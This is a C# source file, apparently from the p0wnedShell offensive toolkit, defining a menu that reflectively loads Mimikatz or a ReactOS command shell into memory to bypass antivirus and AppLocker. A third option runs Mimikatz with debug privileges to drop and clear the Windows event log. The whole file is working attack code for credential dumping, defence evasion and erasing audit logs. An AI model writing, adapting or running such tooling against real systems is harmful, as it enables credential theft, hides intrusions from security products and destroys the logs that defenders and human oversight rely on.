using System;

namespace p0wnedShell
{
    class Execution
    {
        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        public static void PowerBanner()
        {
            string[] toPrint = { "* Reflectively load Mimikatz or ReactOS executable into Memory      *",
                                 "* and bypass AV/AppLocker.                                          *"};
            Program.PrintBanner(toPrint);
        }

        public static void Menu()
        {
            PowerBanner();
            Console.WriteLine(" 1. Reflectively load Mimikatz executable into Memory.");
            Console.WriteLine();
            Console.WriteLine(" 2. Reflectively load ReactOS Command shell into Memory.");
            Console.WriteLine();
            Console.WriteLine(" 3. Use Mimikatz to Clear and Patch Eventlog Service.");
            Console.WriteLine();
            Console.WriteLine(" 4. Back.");
            Console.Write("\nEnter choice: ");

            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");

            int userInput = 0;
            while (true)
            {
                try
                {
                    userInput = Convert.ToInt32(Console.ReadLine());
                    if (userInput < 1 || userInput > 4)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.Write("Enter choice: ");
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.Write("Enter choice: ");
                }
            }

            switch (userInput)
            {
                case 1:
                    if (Arch == "AMD64")
                    {
                        MimiShell();
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    break;
                case 2:
                    if (Arch == "x86")
                    {
                        ReactShell();
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx86\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    break;
                case 3:
                    if (Arch != "AMD64")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else if (!Program.IsElevated)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] For this function to succeed, you need UAC Elevated Administrator privileges.\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else
                    {
                        PatchEventLog();
                    }
                    break;
                default:
                    break;
            }
        }

        public static void MimiShell()
        {
            string[] toPrint = { "* Reflectively load Mimikatz executable into Memory                 *",
                                 "* and bypass AV/AppLocker.                                          *"};
            Program.PrintBanner(toPrint);

            Console.WriteLine("[+] Please wait until loaded...\n");
            BinaryLoader.LoadBinary(Binaries.Mimikatz());

            return;
        }

        public static void ReactShell()
        {
            string[] toPrint = { "* Reflectively load ReactOS executable into Memory                  *",
                                 "* and bypass AV/AppLocker.                                          *"};
            Program.PrintBanner(toPrint);

            Console.WriteLine("[+] Please wait until loaded...\n");

            //string React = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.ReactOS() + "\" -split ' ') -ForceASLR -FuncReturnType Void -Verbose";
            string React = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.ReactOS() + "\" -split ' ') -ForceASLR -FuncReturnType Void";
            try
            {
                P0wnedListener.Execute(React);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static void PatchEventLog()
        {
            string[] toPrint = { "* Use Mimikatz to Clear and Patch Eventlog Service.                 *" };
            Program.PrintBanner(toPrint);

            Console.WriteLine("[+] Please wait until loaded...\n");

            string ClearEventLog = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.Mimikatz() + "\" -split ' ') -ExeArgs \"privilege::debug event::drop event::clear\" -ForceASLR";
            try
            {
                P0wnedListener.Execute(ClearEventLog);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return;
        }

    }
}